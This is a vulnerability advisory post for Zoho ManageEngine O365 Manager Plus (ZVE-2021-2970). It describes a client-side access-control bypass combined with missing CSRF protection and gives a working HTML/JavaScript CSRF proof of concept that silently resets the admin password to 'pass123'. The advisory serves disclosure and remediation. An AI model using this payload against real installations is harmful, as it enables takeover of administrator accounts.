---
layout: post
title:  "Zoho ManageEngine O365 Manager Plus - Admin Account Takeover Chain"
tag: advisory
excerpt_separator: <!--more-->

---

Zoho ManageEngine O365 Manager Plus before Build 4423 is vulnerable to client-side access-control bypass & CSRF attacks.  
<!--more-->

### **Identifiers**
 - ZVE-2021-2970

### **Instances**
  - http://o365.local:8365/RestAPI/WC/Technicians?operation=changePassword

### **Affected versions**
4.4

### **Technical Details:**
It was observed that the application implement client-side controls to prevent an admin user to change their password from /technicians endpoint. This can be seen in the following screenshot as the admin user field is marked as read-only.

  ![](/assets/images/ZVE-2021-2970/1.png)
The above protection can be bypassed by changing specific paramters in request, allowing the change password operation for admin user without the need for old password.

As the affected endpoint also do not have CSRF protection as well, this allows a 1-click account takeover account.

By chaning two vulnerabilities, an attacker can coerce an admin user in updating their  password without the knowledge of old password and hijack their account.

### **Impact:** 
A successful attack will result in admin user account compromise. 

### **Steps to Reproduce:**
  * Login to the admin user account.
  * Save the following html code in a new html file and execute it, in a another browser tab.
    ```html
    <html>
    <body>
    <script>
      function e()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/o365.local:8365\/RestAPI\/WC\/Technicians?operation=changePassword", true);
        xhr.setRequestHeader("Accept", "application\/json, text\/javascript, *\/*; q=0.01");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded; charset=UTF-8");
        xhr.withCredentials = true;
        var body = "TECHNICIAN_DETAILS=%7B%22DELEGATED_ROLES%22%3A%5B%22Reset+Password%22%5D%2C%22ACTIVE%22%3Atrue%2C%22IS_PRODUCT_TECHNICIAN%22%3Atrue%2C%22LOGIN_ID%22%3A1%2C%22IMPERSONATE_ADMIN%22%3Atrue%2C%22DELEGATED_LICENSE_SERVICE%22%3A%7B%7D%2C%22USER_ID%22%3A1%2C%22USER_NAME%22%3A%22admin%22%2C%22USER_AUTH_TYPE%22%3A%22PRODUCT_USER%22%2C%22DELEGATION_ROWS%22%3A%5B%7B%22ROLE_DETAIL%22%3A%7B%22SERVER_VALUE%22%3A4%2C%22CLIENT_VALUE%22%3A%22Reset+Password%22%7D%2C%22vTENANT_DETAIL%22%3A%7B%22SERVER_VALUE%22%3A1%2C%22CLIENT_VALUE%22%3A%22o365.delegation.vtenant.default_name%22%7D%2C%22ACCOUNT_DETAIL%22%3A%7B%22SERVER_VALUE%22%3A1%2C%22CLIENT_VALUE%22%3A%22dhar007.onmicrosoft.com%22%7D%7D%5D%2C%22DELEGATED_ROLES_IDS%22%3A%5B4%5D%2C%22NAME%22%3A%22helpdesk%22%2C%22DELEGATED_DOMAINS_ARRAY%22%3A%5B%5D%2C%22SERVER_VALUE%22%3A3%2C%22DELEGATED_TEMPLATES_ARRAY%22%3A%5B%5D%2C%22AUTHENTICATION%22%3A%22Product+Authentication%22%2C%22DESCRIPTION%22%3A%22Help+Desk+Associate.%22%2C%22DELEGATED_ROLES_STRING%22%3A%22Reset+Password%22%2C%22CLIENT_VALUE%22%3A%22helpdesk%22%2C%22DOMAINNAME%22%3A%22Office365+Manager+Plus+Authentication%22%2C%22SELECTED%22%3Afalse%2C%22PASSWORD%22%3A%22pass123%22%2C%22DOMAIN_NAME%22%3A%22Office365+Manager+Plus+Authentication%22%7D";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
      e();
    </script>
    </body>
    </html>
    ```
  * Above exploit code when executed will change the admin password to pass123.

### **Solution:**
It is recommend to implement CSRF protection for admin .